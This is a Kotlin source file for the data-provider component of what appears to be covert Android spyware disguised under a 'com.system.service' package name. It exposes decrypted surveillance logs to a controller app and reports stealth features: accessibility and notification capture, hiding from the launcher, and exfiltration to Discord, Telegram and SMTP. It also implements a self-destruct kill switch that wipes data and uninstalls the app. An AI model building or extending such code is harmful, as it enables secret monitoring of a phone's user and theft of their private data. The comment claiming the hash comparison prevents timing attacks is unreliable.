package com.system.service.providers

import android.content.ContentProvider
import android.content.ContentValues
import android.content.ComponentName
import android.content.Intent
import android.content.IntentFilter
import android.content.UriMatcher
import android.database.Cursor
import android.database.MatrixCursor
import android.net.Uri
import android.os.BatteryManager
import android.os.Bundle
import com.system.service.core.Config
import com.system.service.core.Stealth
import com.system.service.core.Storage
import com.system.service.core.MonitorCore
import java.security.MessageDigest

/**
 * DataProvider — ContentProvider that exposes monitor data to the Controller APK.
 *
 * Security: Protected by signature-level permission (com.system.service.PROVIDER_ACCESS).
 * Only apps signed with the same key can access this provider.
 *
 * URIs:
 *   content://com.system.service.provider/logs     — all decrypted log entries
 *   content://com.system.service.provider/status    — service state + config flags
 *
 * Call methods:
 *   "pause"         — pause monitoring
 *   "resume"        — resume monitoring
 *   "wipe"          — wipe all stored data
 *   "kill"          — kill switch (wipe + stop + self-destruct)
 *   "stop_service"  — stop the monitor service
 *   "clear_config"  — clear all configuration
 *   "show_launcher" — re-show monitor app in launcher
 *   "get_status"    — get detailed status as Bundle
 */
class DataProvider : ContentProvider() {

    companion object {
        const val AUTHORITY = "com.system.service.provider"
        val CONTENT_URI: Uri = Uri.parse("content://$AUTHORITY")

        private const val LOGS = 1
        private const val STATUS = 2

        private val uriMatcher = UriMatcher(UriMatcher.NO_MATCH).apply {
            addURI(AUTHORITY, "logs", LOGS)
            addURI(AUTHORITY, "status", STATUS)
        }
    }

    override fun onCreate(): Boolean {
        context?.let { Config.init(it) }
        return true
    }

    override fun query(
        uri: Uri,
        projection: Array<out String>?,
        selection: String?,
        selectionArgs: Array<out String>?,
        sortOrder: String?
    ): Cursor? {
        val ctx = context ?: return null

        return when (uriMatcher.match(uri)) {
            LOGS -> {
                Storage.init(ctx)
                val logs = try { Storage.readAllLogs() } catch (_: Exception) { emptyList() }
                val cursor = MatrixCursor(arrayOf("_id", "content"))
                logs.forEachIndexed { index, line ->
                    cursor.addRow(arrayOf(index, line))
                }
                cursor
            }

            STATUS -> {
                val cursor = MatrixCursor(arrayOf(
                    "is_running", "is_paused", "is_configured",
                    "acc_enabled", "notif_enabled", "battery_exempt",
                    "has_discord", "has_telegram", "has_smtp",
                    "log_count", "file_size",
                    "kill_switch", "local_log", "hide_app"
                ))

                Storage.init(ctx)
                val logCount = try { Storage.readAllLogs().size } catch (_: Exception) { 0 }
                val fileSize = try { Storage.getFileSize() } catch (_: Exception) { 0L }

                cursor.addRow(arrayOf(
                    if (MonitorCore.isRunning) 1 else 0,
                    if (MonitorCore.isPaused) 1 else 0,
                    if (Config.isConfigured) 1 else 0,
                    if (Stealth.isAccessibilityEnabled(ctx)) 1 else 0,
                    if (Stealth.isNotificationListenerEnabled(ctx)) 1 else 0,
                    if (!Stealth.isBatteryOptimized(ctx)) 1 else 0,
                    if (Config.webhookUrl.isNotBlank()) 1 else 0,
                    if (Config.telegramToken.isNotBlank() && Config.telegramChatId.isNotBlank()) 1 else 0,
                    if (Config.smtpHost.isNotBlank() && Config.smtpUser.isNotBlank()) 1 else 0,
                    logCount,
                    fileSize,
                    if (Config.killSwitchEnabled) 1 else 0,
                    if (Config.logLocal) 1 else 0,
                    if (Config.hideApp) 1 else 0
                ))
                cursor
            }

            else -> null
        }
    }

    override fun call(method: String, arg: String?, extras: Bundle?): Bundle? {
        val ctx = context ?: return null
        val result = Bundle()

        when (method) {
            "pause" -> {
                MonitorCore.isPaused = true
                result.putBoolean("success", true)
            }
            "resume" -> {
                MonitorCore.isPaused = false
                result.putBoolean("success", true)
            }
            "wipe" -> {
                Storage.init(ctx)
                Storage.wipeAll()
                result.putBoolean("success", true)
            }
            "stop", "stop_service" -> {
                MonitorCore.stop()
                result.putBoolean("success", true)
            }
            "clear_config" -> {
                Config.isConfigured = false
                Config.webhookUrl = ""
                Config.telegramToken = ""
                Config.telegramChatId = ""
                Config.smtpHost = ""
                Config.smtpUser = ""
                Config.smtpPass = ""
                Config.smtpTo = ""
                Config.encryptionPassword = ""
                Config.killSwitchEnabled = false
                Config.hideApp = false
                MonitorCore.stop()
                result.putBoolean("success", true)
            }
            "show_app", "show_launcher" -> {
                Stealth.showInLauncher(ctx)
                result.putBoolean("success", true)
            }
            "nuke", "kill" -> {
                Storage.init(ctx)
                Storage.wipeAll()
                Config.isConfigured = false
                MonitorCore.stop()
                try {
                    val component = ComponentName(ctx, com.system.service.receivers.DeviceAdminReceiver::class.java)
                    val dpm = ctx.getSystemService(android.content.Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
                    dpm.removeActiveAdmin(component)

                    val intent = Intent(Intent.ACTION_DELETE)
                    intent.data = Uri.parse("package:${ctx.packageName}")
                    intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
                    ctx.startActivity(intent)
                } catch (_: Exception) { }
                result.putBoolean("success", true)
            }
            "get_status" -> {
                Storage.init(ctx)
                result.putBoolean("is_running", MonitorCore.isRunning)
                result.putBoolean("is_paused", MonitorCore.isPaused)
                result.putBoolean("is_configured", Config.isConfigured)
                result.putBoolean("acc_enabled", Stealth.isAccessibilityEnabled(ctx))
                result.putBoolean("notif_enabled", Stealth.isNotificationListenerEnabled(ctx))
                result.putBoolean("battery_exempt", !Stealth.isBatteryOptimized(ctx))
                result.putBoolean("has_discord", Config.webhookUrl.isNotBlank())
                result.putBoolean("has_telegram", Config.telegramToken.isNotBlank() && Config.telegramChatId.isNotBlank())
                result.putBoolean("has_smtp", Config.smtpHost.isNotBlank() && Config.smtpUser.isNotBlank())
                result.putInt("log_count", try { Storage.readAllLogs().size } catch (_: Exception) { 0 })
                result.putLong("file_size", try { Storage.getFileSize() } catch (_: Exception) { 0L })
                result.putBoolean("kill_switch", Config.killSwitchEnabled)
                result.putBoolean("local_log", Config.logLocal)
                result.putBoolean("hide_app", Config.hideApp)
                result.putBoolean("has_password", Config.encryptionPassword.isNotBlank())

                // Read battery data directly from system (not ThermalGuard which may not be running)
                val batteryIntent = ctx.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
                val tempRaw = batteryIntent?.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, 0) ?: 0
                val level = batteryIntent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
                val scale = batteryIntent?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
                val status = batteryIntent?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
                val realBatteryLevel = if (scale > 0) (level * 100) / scale else -1
                val realBatteryTemp = tempRaw / 10f
                val realIsCharging = status == BatteryManager.BATTERY_STATUS_CHARGING ||
                        status == BatteryManager.BATTERY_STATUS_FULL
                val pm = ctx.getSystemService(android.content.Context.POWER_SERVICE) as android.os.PowerManager
                val realPowerSave = pm.isPowerSaveMode

                // Use ThermalGuard level if service is running, otherwise compute from temp
                val thermalLevel = if (MonitorCore.isRunning) {
                    com.system.service.core.ThermalGuard.currentLevel.name
                } else {
                    when {
                        tempRaw >= 450 -> "CRITICAL"
                        tempRaw >= 420 -> "HOT"
                        tempRaw >= 380 -> "WARM"
                        else -> "NORMAL"
                    }
                }

                result.putString("thermal_level", thermalLevel)
                result.putFloat("battery_temp", realBatteryTemp)
                result.putInt("battery_level", realBatteryLevel)
                result.putBoolean("is_charging", realIsCharging)
                result.putBoolean("power_save", realPowerSave)
                result.putBoolean("success", true)
            }
            "verify_password" -> {
                // Controller auth: verify password matches Monitor's encryption password
                val password = arg ?: ""
                val storedPassword = Config.encryptionPassword
                val matched = if (storedPassword.isBlank()) {
                    // No password set — accept empty password
                    password.isBlank()
                } else {
                    // Compare using SHA-256 hash to avoid timing attacks
                    val inputHash = MessageDigest.getInstance("SHA-256")
                        .digest(password.toByteArray(Charsets.UTF_8))
                    val storedHash = MessageDigest.getInstance("SHA-256")
                        .digest(storedPassword.toByteArray(Charsets.UTF_8))
                    inputHash.contentEquals(storedHash)
                }
                result.putBoolean("success", true)
                result.putBoolean("verified", matched)
            }
            else -> {
                result.putBoolean("success", false)
                result.putString("error", "Unknown method: $method")
            }
        }
        return result
    }

    // Not used — read-only provider
    override fun getType(uri: Uri): String? = null
    override fun insert(uri: Uri, values: ContentValues?): Uri? = null
    override fun update(uri: Uri, values: ContentValues?, selection: String?, selectionArgs: Array<out String>?): Int = 0
    override fun delete(uri: Uri, selection: String?, selectionArgs: Array<out String>?): Int = 0
}
